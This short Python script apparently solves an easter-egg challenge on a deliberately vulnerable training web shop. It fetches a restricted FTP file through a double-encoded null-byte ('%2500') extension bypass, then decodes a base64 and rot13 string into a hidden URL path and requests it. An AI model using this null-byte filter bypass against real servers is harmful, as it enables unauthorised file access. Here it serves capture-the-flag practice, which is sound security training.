from urllib.request import urlopen
response = urlopen("http://15.236.144.183:8082/ftp/eastere.gg%2500.md")
 # print(response.read().decode())

from base64 import b64decode
from codecs import decode
urlpath = decode(b64decode(b'L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==').decode(), 'rot13')
response = urlopen("http://15.236.144.183:8082" + urlpath)
print(response.read().decode())